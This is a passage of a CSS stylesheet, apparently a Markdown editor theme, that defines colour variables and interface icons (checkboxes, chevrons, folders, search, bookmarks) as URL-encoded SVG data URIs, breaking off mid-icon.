--star-bg: var(--color-scale-blue-2);    --question-color: #880e4f;    --question-bg: #f8bbd0;    --alert-color: #8a2a0d;    --alert-bg: #e69d94;    --note-color: #004d40;    --note-bg: #8be3d6;    --lightbulb-color: #b0791b;    --lightbulb-bg: #fff9c4;}:root {    --control-text-color: var(--color-text-secondary);    --bg-color: #ffffff;    /*change background*/    --text-color: var(--color-text-primary);    /*change text color*/    --md-char-color: #b3bdd1;    --meta-content-color: #398ea3;    /*change color of meta contents like image text or link address in markdown */    --primary-color: #486df1;    --accent-color: #486df1;    /* color of primary buttons */    --primary-btn-border-color: var(--color-border-primary);    --primary-btn-text-color: #fff;    --window-border: 1px solid var(--color-bg-tertiary);    /*border for sidebar, etc*/    --active-file-bg-color: var(--color-auto-blue-1);    /*background color if list item in file tree or file list*/    --active-file-text-color: inherit;    --active-file-border-color: var(--color-auto-blue-6);    --side-bar-bg-color: #f9fafb;    /*change background of sidebar*/    --item-hover-bg-color: rgba(229, 229, 229, 0.59);    /*background of control items when hover, like menu in sidebar*/    --item-hover-text-color: inherit;    /*mono font for codes, fences*/    --checkbox-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M18%203C19.6569%203%2021%204.34315%2021%206V18C21%2019.6569%2019.6569%2021%2018%2021H6C4.34315%2021%203%2019.6569%203%2018V6C3%204.34315%204.34315%203%206%203H18ZM16.4697%207.96967L10%2014.4393L7.53033%2011.9697C7.23744%2011.6768%206.76256%2011.6768%206.46967%2011.9697C6.17678%2012.2626%206.17678%2012.7374%206.46967%2013.0303L9.46967%2016.0303C9.76256%2016.3232%2010.2374%2016.3232%2010.5303%2016.0303L17.5303%209.03033C17.8232%208.73744%2017.8232%208.26256%2017.5303%207.96967C17.2374%207.67678%2016.7626%207.67678%2016.4697%207.96967Z%22%20fill%3D%22%23486df1%22/%3E%0A%3C/svg%3E%0A");    --dots: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M10%206C9.30964%206%208.75%205.44036%208.75%204.75C8.75%204.05964%209.30964%203.5%2010%203.5C10.6904%203.5%2011.25%204.05964%2011.25%204.75C11.25%205.44036%2010.6904%206%2010%206Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M10%2011.25C9.30964%2011.25%208.75%2010.6904%208.75%2010C8.75%209.30964%209.30964%208.75%2010%208.75C10.6904%208.75%2011.25%209.30964%2011.25%2010C11.25%2010.6904%2010.6904%2011.25%2010%2011.25Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M8.75%2015.25C8.75%2015.9404%209.30964%2016.5%2010%2016.5C10.6904%2016.5%2011.25%2015.9404%2011.25%2015.25C11.25%2014.5596%2010.6904%2014%2010%2014C9.30964%2014%208.75%2014.5596%208.75%2015.25Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --cells: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M7.5%2011C8.32843%2011%209%2011.6716%209%2012.5V16.5C9%2017.3284%208.32843%2018%207.5%2018H3.5C2.67157%2018%202%2017.3284%202%2016.5V12.5C2%2011.6716%202.67157%2011%203.5%2011H7.5ZM16.5%2011C17.3284%2011%2018%2011.6716%2018%2012.5V16.5C18%2017.3284%2017.3284%2018%2016.5%2018H12.5C11.6716%2018%2011%2017.3284%2011%2016.5V12.5C11%2011.6716%2011.6716%2011%2012.5%2011H16.5ZM7.5%2012H3.5C3.22386%2012%203%2012.2239%203%2012.5V16.5C3%2016.7761%203.22386%2017%203.5%2017H7.5C7.77614%2017%208%2016.7761%208%2016.5V12.5C8%2012.2239%207.77614%2012%207.5%2012ZM16.5%2012H12.5C12.2239%2012%2012%2012.2239%2012%2012.5V16.5C12%2016.7761%2012.2239%2017%2012.5%2017H16.5C16.7761%2017%2017%2016.7761%2017%2016.5V12.5C17%2012.2239%2016.7761%2012%2016.5%2012ZM7.5%202C8.32843%202%209%202.67157%209%203.5V7.5C9%208.32843%208.32843%209%207.5%209H3.5C2.67157%209%202%208.32843%202%207.5V3.5C2%202.67157%202.67157%202%203.5%202H7.5ZM16.5%202C17.3284%202%2018%202.67157%2018%203.5V7.5C18%208.32843%2017.3284%209%2016.5%209H12.5C11.6716%209%2011%208.32843%2011%207.5V3.5C11%202.67157%2011.6716%202%2012.5%202H16.5ZM7.5%203H3.5C3.22386%203%203%203.22386%203%203.5V7.5C3%207.77614%203.22386%208%203.5%208H7.5C7.77614%208%208%207.77614%208%207.5V3.5C8%203.22386%207.77614%203%207.5%203ZM16.5%203H12.5C12.2239%203%2012%203.22386%2012%203.5V7.5C12%207.77614%2012.2239%208%2012.5%208H16.5C16.7761%208%2017%207.77614%2017%207.5V3.5C17%203.22386%2016.7761%203%2016.5%203Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --add: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M9.5%2016.5C9.5%2016.7761%209.72386%2017%2010%2017C10.2761%2017%2010.5%2016.7761%2010.5%2016.5V10.5H16.5C16.7761%2010.5%2017%2010.2761%2017%2010C17%209.72386%2016.7761%209.5%2016.5%209.5H10.5V3.5C10.5%203.22386%2010.2761%203%2010%203C9.72386%203%209.5%203.22386%209.5%203.5V9.5H3.5C3.22386%209.5%203%209.72386%203%2010C3%2010.2761%203.22386%2010.5%203.5%2010.5H9.5V16.5Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --chevron-right: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M4.46967%202.21967C4.17678%202.51256%204.17678%202.98744%204.46967%203.28033L7.18934%206L4.46967%208.71967C4.17678%209.01256%204.17678%209.48744%204.46967%209.78033C4.76256%2010.0732%205.23744%2010.0732%205.53033%209.78033L8.78033%206.53033C9.07322%206.23744%209.07322%205.76256%208.78033%205.46967L5.53033%202.21967C5.23744%201.92678%204.76256%201.92678%204.46967%202.21967Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --chevron-down: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2212%22%20height%3D%2212%22%20viewBox%3D%220%200%2012%2012%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M2.21967%204.46967C2.51256%204.17678%202.98744%204.17678%203.28033%204.46967L6%207.18934L8.71967%204.46967C9.01256%204.17678%209.48744%204.17678%209.78033%204.46967C10.0732%204.76256%2010.0732%205.23744%209.78033%205.53033L6.53033%208.78033C6.23744%209.07322%205.76256%209.07322%205.46967%208.78033L2.21967%205.53033C1.92678%205.23744%201.92678%204.76256%202.21967%204.46967Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --document: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M7.5%207C7.22386%207%207%207.22386%207%207.5C7%207.77614%207.22386%208%207.5%208H12.5C12.7761%208%2013%207.77614%2013%207.5C13%207.22386%2012.7761%207%2012.5%207H7.5Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M7%2010.5C7%2010.2239%207.22386%2010%207.5%2010H12.5C12.7761%2010%2013%2010.2239%2013%2010.5C13%2010.7761%2012.7761%2011%2012.5%2011H7.5C7.22386%2011%207%2010.7761%207%2010.5Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M7.5%2013C7.22386%2013%207%2013.2239%207%2013.5C7%2013.7761%207.22386%2014%207.5%2014H9.5C9.77614%2014%2010%2013.7761%2010%2013.5C10%2013.2239%209.77614%2013%209.5%2013H7.5Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M6.5%202C6.22386%202%206%202.22386%206%202.5V3H5.5C4.67157%203%204%203.67157%204%204.5V16.5C4%2017.3284%204.67157%2018%205.5%2018H11.5C11.6326%2018%2011.7598%2017.9473%2011.8536%2017.8536L15.8536%2013.8536C15.9473%2013.7598%2016%2013.6326%2016%2013.5V4.5C16%203.67157%2015.3284%203%2014.5%203H14V2.5C14%202.22386%2013.7761%202%2013.5%202C13.2239%202%2013%202.22386%2013%202.5V3H10.5V2.5C10.5%202.22386%2010.2761%202%2010%202C9.72386%202%209.5%202.22386%209.5%202.5V3H7V2.5C7%202.22386%206.77614%202%206.5%202ZM14.5%204C14.7761%204%2015%204.22386%2015%204.5V13H12.5C11.6716%2013%2011%2013.6716%2011%2014.5V17H5.5C5.22386%2017%205%2016.7761%205%2016.5V4.5C5%204.22386%205.22386%204%205.5%204H14.5ZM14.2929%2014L12%2016.2929V14.5C12%2014.2239%2012.2239%2014%2012.5%2014H14.2929Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --folder: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M7.16667%203C7.43713%203%207.70151%203.0731%207.93238%203.21016L8.06667%203.3L9.667%204.5H15.5C16.7703%204.5%2017.8192%205.44737%2017.9789%206.67409L17.9947%206.83562L18%207V14.5C18%2015.8255%2016.9685%2016.91%2015.6644%2016.9947L15.5%2017H4.5C3.17452%2017%202.08996%2015.9685%202.00532%2014.6644L2%2014.5V5.5C2%204.17452%203.03154%203.08996%204.33562%203.00532L4.5%203H7.16667ZM8.15763%207.03449C7.90991%207.2946%207.57838%207.45592%207.22435%207.49219L7.07143%207.5L3%207.499V14.5C3%2015.2797%203.59489%2015.9204%204.35554%2015.9931L4.5%2016H15.5C16.2797%2016%2016.9204%2015.4051%2016.9931%2014.6445L17%2014.5V7C17%206.2203%2016.4051%205.57955%2015.6445%205.50687L15.5%205.5H9.617L8.15763%207.03449ZM7.16667%204H4.5C3.7203%204%203.07955%204.59489%203.00687%205.35554L3%205.5V6.499L7.07143%206.5C7.1809%206.5%207.28655%206.46411%207.37274%206.39902L7.4335%206.34483L8.694%205.021L7.46667%204.1C7.40176%204.05132%207.32632%204.01941%207.24701%204.0065L7.16667%204Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --navigation: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M3%206.5C3.55228%206.5%204%206.05228%204%205.5C4%204.94772%203.55228%204.5%203%204.5C2.44772%204.5%202%204.94772%202%205.5C2%206.05228%202.44772%206.5%203%206.5ZM6%205.5C6%205.22386%206.22386%205%206.5%205H17.5C17.7761%205%2018%205.22386%2018%205.5C18%205.77614%2017.7761%206%2017.5%206H6.5C6.22386%206%206%205.77614%206%205.5ZM6%209.5C6%209.22386%206.22386%209%206.5%209H17.5C17.7761%209%2018%209.22386%2018%209.5C18%209.77614%2017.7761%2010%2017.5%2010H6.5C6.22386%2010%206%209.77614%206%209.5ZM6.5%2013C6.22386%2013%206%2013.2239%206%2013.5C6%2013.7761%206.22386%2014%206.5%2014H17.5C17.7761%2014%2018%2013.7761%2018%2013.5C18%2013.2239%2017.7761%2013%2017.5%2013H6.5ZM4%2013.5C4%2014.0523%203.55228%2014.5%203%2014.5C2.44772%2014.5%202%2014.0523%202%2013.5C2%2012.9477%202.44772%2012.5%203%2012.5C3.55228%2012.5%204%2012.9477%204%2013.5ZM3%2010.5C3.55228%2010.5%204%2010.0523%204%209.5C4%208.94772%203.55228%208.5%203%208.5C2.44772%208.5%202%208.94772%202%209.5C2%2010.0523%202.44772%2010.5%203%2010.5Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --tree: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M9%205C9%203.34315%207.65685%202%206%202C4.34315%202%203%203.34315%203%205C3%206.4865%204.08114%207.72048%205.5%207.95852V12.0415C4.08114%2012.2795%203%2013.5135%203%2015C3%2016.6569%204.34315%2018%206%2018C7.65685%2018%209%2016.6569%209%2015C9%2013.5135%207.91886%2012.2795%206.5%2012.0415V11H12C13.3807%2011%2014.5%209.88071%2014.5%208.5V7.95852C15.9189%207.72048%2017%206.4865%2017%205C17%203.34315%2015.6569%202%2014%202C12.3431%202%2011%203.34315%2011%205C11%206.4865%2012.0811%207.72048%2013.5%207.95852V8.5C13.5%209.32843%2012.8284%2010%2012%2010H6.5V7.95852C7.91886%207.72048%209%206.4865%209%205ZM6%207C4.89543%207%204%206.10457%204%205C4%203.89543%204.89543%203%206%203C7.10457%203%208%203.89543%208%205C8%206.10457%207.10457%207%206%207ZM6%2017C4.89543%2017%204%2016.1046%204%2015C4%2013.8954%204.89543%2013%206%2013C7.10457%2013%208%2013.8954%208%2015C8%2016.1046%207.10457%2017%206%2017ZM16%205C16%206.10457%2015.1046%207%2014%207C12.8954%207%2012%206.10457%2012%205C12%203.89543%2012.8954%203%2014%203C15.1046%203%2016%203.89543%2016%205Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --search: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M8.5%203C11.5376%203%2014%205.46243%2014%208.5C14%209.83879%2013.5217%2011.0659%2012.7266%2012.0196L16.8536%2016.1464C17.0488%2016.3417%2017.0488%2016.6583%2016.8536%2016.8536C16.68%2017.0271%2016.4106%2017.0464%2016.2157%2016.9114L16.1464%2016.8536L12.0196%2012.7266C11.0659%2013.5217%209.83879%2014%208.5%2014C5.46243%2014%203%2011.5376%203%208.5C3%205.46243%205.46243%203%208.5%203ZM8.5%204C6.01472%204%204%206.01472%204%208.5C4%2010.9853%206.01472%2013%208.5%2013C10.9853%2013%2013%2010.9853%2013%208.5C13%206.01472%2010.9853%204%208.5%204Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --checkbox-checked: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M18.25%203C19.7688%203%2021%204.23122%2021%205.75V18.25C21%2019.7688%2019.7688%2021%2018.25%2021H5.75C4.23122%2021%203%2019.7688%203%2018.25V5.75C3%204.23122%204.23122%203%205.75%203H18.25ZM18.25%204.5H5.75C5.05964%204.5%204.5%205.05964%204.5%205.75V18.25C4.5%2018.9404%205.05964%2019.5%205.75%2019.5H18.25C18.9404%2019.5%2019.5%2018.9404%2019.5%2018.25V5.75C19.5%205.05964%2018.9404%204.5%2018.25%204.5ZM10%2014.4393L16.4697%207.96967C16.7626%207.67678%2017.2374%207.67678%2017.5303%207.96967C17.7966%208.23594%2017.8208%208.6526%2017.6029%208.94621L17.5303%209.03033L10.5303%2016.0303C10.2641%2016.2966%209.8474%2016.3208%209.55379%2016.1029L9.46967%2016.0303L6.46967%2013.0303C6.17678%2012.7374%206.17678%2012.2626%206.46967%2011.9697C6.73594%2011.7034%207.1526%2011.6792%207.44621%2011.8971L7.53033%2011.9697L10%2014.4393L16.4697%207.96967L10%2014.4393Z%22%20fill%3D%22%23000%22/%3E%0A%3C/svg%3E%0A");    --checkbox-unchecked: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2224%22%20height%3D%2224%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M5.75%203H18.25C19.7688%203%2021%204.23122%2021%205.75V18.25C21%2019.7688%2019.7688%2021%2018.25%2021H5.75C4.23122%2021%203%2019.7688%203%2018.25V5.75C3%204.23122%204.23122%203%205.75%203ZM5.75%204.5C5.05964%204.5%204.5%205.05964%204.5%205.75V18.25C4.5%2018.9404%205.05964%2019.5%205.75%2019.5H18.25C18.9404%2019.5%2019.5%2018.9404%2019.5%2018.25V5.75C19.5%205.05964%2018.9404%204.5%2018.25%204.5H5.75Z%22%20fill%3D%22%23000%22/%3E%0A%3C/svg%3E%0A");    --case: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M13.4911%203.50005C13.7013%203.50299%2013.8873%203.63714%2013.9563%203.83574L17.6085%2014.3357C17.6992%2014.5966%2017.5613%2014.8815%2017.3005%2014.9722C17.0397%2015.063%2016.7547%2014.9251%2016.664%2014.6643L15.7373%2012L10.9833%2012L9.96737%2014.6774C9.8694%2014.9356%209.58069%2015.0654%209.32251%2014.9675C9.06433%2014.8695%208.93445%2014.5808%209.03241%2014.3226L10.2727%2011.0539V11H10.2932L13.0166%203.82262C13.0912%203.62603%2013.2808%203.49711%2013.4911%203.50005ZM13.4636%205.46323L11.3627%2011L15.3895%2011L13.4636%205.46323Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M5.6667%208.70091L5.85817%208.70749C7.16522%208.77248%207.94311%209.52482%207.997%2010.737L8%2010.8735V14.5402C8%2014.7933%207.8119%2015.0025%207.56785%2015.0356L7.5%2015.0402C7.24687%2015.0402%207.03767%2014.8521%207.00456%2014.6081L7%2014.5402L6.9991%2014.4706C6.34072%2014.8475%205.7317%2015.0402%205.16667%2015.0402C3.94105%2015.0402%203%2014.1772%203%2012.8735C3%2011.724%203.79229%2010.8699%205.10646%2010.7105C5.728%2010.6351%206.35968%2010.6823%206.99902%2010.8503C6.99247%2010.1122%206.62837%209.74702%205.8085%209.70625C5.16701%209.67435%204.7162%209.76443%204.45216%209.94958C4.22607%2010.1081%203.91426%2010.0534%203.75572%209.82728C3.59717%209.60118%203.65193%209.28937%203.87802%209.13083C4.31656%208.8233%204.91381%208.68705%205.6667%208.70091ZM6.99933%2011.916L6.79742%2011.8558C6.25917%2011.7078%205.73655%2011.6657%205.22687%2011.7275C4.40527%2011.8271%204%2012.264%204%2012.8978C4%2013.6289%204.47493%2014.0644%205.16667%2014.0644C5.62021%2014.0644%206.17899%2013.8549%206.83419%2013.422L6.99933%2013.3094V11.916Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --arrowleft: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M9.16289%2016.8692C9.36683%2017.0555%209.68308%2017.0411%209.86926%2016.8371C10.0554%2016.6331%2010.041%2016.3168%209.83711%2016.1306L3.66925%2010.4988L17.5%2010.4988C17.7761%2010.4988%2018%2010.2749%2018%209.99868C18%209.72249%2017.7761%209.49859%2017.5%209.49859L3.67214%209.49859L9.83711%203.86943C10.041%203.68322%2010.0554%203.3669%209.86926%203.16293C9.68308%202.95895%209.36683%202.94455%209.16289%203.13076L2.24654%209.446C2.10659%209.57378%202.02676%209.74135%202.00705%209.91453C2.00241%209.94189%202%209.97%202%209.99868C2%2010.0256%202.00212%2010.0519%202.0062%2010.0777C2.02437%2010.2536%202.10449%2010.4243%202.24654%2010.554L9.16289%2016.8692Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --match: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M9.5%2012.75C9.5%2013.1642%209.16421%2013.5%208.75%2013.5C8.33579%2013.5%208%2013.1642%208%2012.75C8%2012.3358%208.33579%2012%208.75%2012C9.16421%2012%209.5%2012.3358%209.5%2012.75Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M11.75%2012.75C11.75%2013.1642%2011.4142%2013.5%2011%2013.5C10.5858%2013.5%2010.25%2013.1642%2010.25%2012.75C10.25%2012.3358%2010.5858%2012%2011%2012C11.4142%2012%2011.75%2012.3358%2011.75%2012.75Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M14%2012.75C14%2013.1642%2013.6642%2013.5%2013.25%2013.5C12.8358%2013.5%2012.5%2013.1642%2012.5%2012.75C12.5%2012.3358%2012.8358%2012%2013.25%2012C13.6642%2012%2014%2012.3358%2014%2012.75Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M16.25%2012.75C16.25%2013.1642%2015.9142%2013.5%2015.5%2013.5C15.0858%2013.5%2014.75%2013.1642%2014.75%2012.75C14.75%2012.3358%2015.0858%2012%2015.5%2012C15.9142%2012%2016.25%2012.3358%2016.25%2012.75Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M8.75%208C9.16421%208%209.5%207.66421%209.5%207.25C9.5%206.83579%209.16421%206.5%208.75%206.5C8.33579%206.5%208%206.83579%208%207.25C8%207.66421%208.33579%208%208.75%208Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M11%208C11.4142%208%2011.75%207.66421%2011.75%207.25C11.75%206.83579%2011.4142%206.5%2011%206.5C10.5858%206.5%2010.25%206.83579%2010.25%207.25C10.25%207.66421%2010.5858%208%2011%208Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M13.25%208C13.6642%208%2014%207.66421%2014%207.25C14%206.83579%2013.6642%206.5%2013.25%206.5C12.8358%206.5%2012.5%206.83579%2012.5%207.25C12.5%207.66421%2012.8358%208%2013.25%208Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M15.5%208C15.9142%208%2016.25%207.66421%2016.25%207.25C16.25%206.83579%2015.9142%206.5%2015.5%206.5C15.0858%206.5%2014.75%206.83579%2014.75%207.25C14.75%207.66421%2015.0858%208%2015.5%208Z%22%20fill%3D%22%23636566%22/%3E%0A%3Cpath%20d%3D%22M2%207C2%205.34315%203.34315%204%205%204H15C16.6569%204%2018%205.34315%2018%207V13C18%2014.6569%2016.6569%2016%2015%2016H5C3.34315%2016%202%2014.6569%202%2013V7ZM5%205C3.89543%205%203%205.89543%203%207V9.5H6V5H5ZM6%2010.5H3V13C3%2014.1046%203.89543%2015%205%2015H6V10.5ZM7%2010.5V15H15C16.1046%2015%2017%2014.1046%2017%2013V10.5H7ZM17%209.5V7C17%205.89543%2016.1046%205%2015%205H7V9.5H17Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --chevron-up: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M4.14708%2012.3544C3.95147%2012.1594%203.9509%2011.8429%204.14582%2011.6472L9.6108%206.16276C9.82574%205.94705%2010.1751%205.94705%2010.39%206.16276L15.855%2011.6472C16.0499%2011.8429%2016.0493%2012.1594%2015.8537%2012.3544C15.6581%2012.5493%2015.3415%2012.5487%2015.1466%2012.3531L10.0004%207.18851L4.85418%2012.3531C4.65927%2012.5487%204.34269%2012.5493%204.14708%2012.3544Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --chevron-next: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M15.8527%207.64582C16.0484%207.84073%2016.0489%208.15731%2015.854%208.35292L10.389%2013.8374C10.1741%2014.0531%209.82477%2014.0531%209.60982%2013.8374L4.14484%208.35292C3.94993%208.15731%203.95049%207.84073%204.1461%207.64582C4.34171%207.4509%204.65829%207.45147%204.85321%207.64708L9.99942%2012.8117L15.1456%207.64708C15.3406%207.45147%2015.6571%207.4509%2015.8527%207.64582Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --dismiss: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M4.08859%204.21569L4.14645%204.14645C4.32001%203.97288%204.58944%203.9536%204.78431%204.08859L4.85355%204.14645L10%209.293L15.1464%204.14645C15.32%203.97288%2015.5894%203.9536%2015.7843%204.08859L15.8536%204.14645C16.0271%204.32001%2016.0464%204.58944%2015.9114%204.78431L15.8536%204.85355L10.707%2010L15.8536%2015.1464C16.0271%2015.32%2016.0464%2015.5894%2015.9114%2015.7843L15.8536%2015.8536C15.68%2016.0271%2015.4106%2016.0464%2015.2157%2015.9114L15.1464%2015.8536L10%2010.707L4.85355%2015.8536C4.67999%2016.0271%204.41056%2016.0464%204.21569%2015.9114L4.14645%2015.8536C3.97288%2015.68%203.9536%2015.4106%204.08859%2015.2157L4.14645%2015.1464L9.293%2010L4.14645%204.85355C3.97288%204.67999%203.9536%204.41056%204.08859%204.21569L4.14645%204.14645L4.08859%204.21569Z%22%20fill%3D%22%23636566%22/%3E%0A%3C/svg%3E%0A");    --bookmark-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M4%204.5C4%203.11929%205.11929%202%206.5%202H13.5C14.8807%202%2016%203.11929%2016%204.5V17.5C16%2017.6881%2015.8945%2017.8602%2015.7269%2017.9456C15.5593%2018.0309%2015.358%2018.015%2015.2059%2017.9044L10%2014.1183L4.79409%2017.9044C4.64199%2018.015%204.4407%2018.0309%204.27311%2017.9456C4.10553%2017.8602%204%2017.6881%204%2017.5V4.5Z%22%20fill%3D%22%23311b92%22/%3E%0A%3C/svg%3E%0A");    --chat-help-filled: url("data:image/svg+xml;utf8,%3Csvg%20width%3D%2220%22%20height%3D%2220%22%20viewBox%3D%220%200%2020%2020%22%20fill%3D%22none%22%20xmlns%3D%22http%3A//www.w3.org/2000/svg%22%3E%0A%3Cpath%20d%3D%22M2.00001%2010C2.00001%205.58172%205.58173%202%2010%202C14.4183%202%2018%205.58172%2018%2010C18%2014.4183%2014.4183%2018%2010%2018C8.65078%2018%207.37829%2017.6656%206.26225%2017.0748L2.62128%2017.9851C2.45089%2018.0277%202.27065%2017.9777%202.14646%2017.8536C2.02227%2017.7294%201.97234%2017.5491%202.01494%2017.3787L2.92518%2013.7378C2.33442%2012.6217%202.00001%2011.3492%202.00001%2010ZM9.25027%207.30723C9.40317%207.13358%209.64031%207%2010%207C10.3597%207%2010.5968%207.13358%2010.7497%207.30723C10.9113%207.49072%2011%207.74463%2011%208C11%208.31707%2010.9286%208.52273%2010.8337%208.68547C10.7328%208.85858%2010.5985%208.99908%2010.4106%209.19559L10.3885%209.21878C10.2003%209.41576%209.96787%209.66319%209.79142%2010.0002C9.61017%2010.3464%209.5%2010.7611%209.5%2011.2929C9.5%2011.5691%209.72386%2011.7929%2010%2011.7929C10.2761%2011.7929%2010.5%2011.5691%2010.5%2011.2929C10.5%2010.9085%2010.5773%2010.6551%2010.6773%2010.4641C10.7821%2010.2639%2010.9247%2010.1051%2011.1115%209.90956L11.1528%209.86652C11.3225%209.68963%2011.5347%209.46855%2011.6976%209.18921C11.8839%208.86964%2012%208.48947%2012%208C12%207.52689%2011.8387%207.0308%2011.5003%206.64641C11.1532%206.25219%2010.6403%206%2010%206C9.35969%206%208.84683%206.25219%208.49973%206.64641C8.16129%207.0308%208%207.52689%208%208C8%208.27614%208.22386%208.5%208.5%208.5C8.77614%208.5%209%208.27614%209%208C9%207.74463%209.08871%207.49072%209.25027%207.30723ZM10.6995%2013.5126C10.6995%2013.1262%2010.3863%2012.813%209.99989%2012.813C9.61352%2012.813%209.30029%2013.1262%209.30029%2013.5126C9.30029%2013.899%209.61352%2014.2122%209.99989%2014.2122C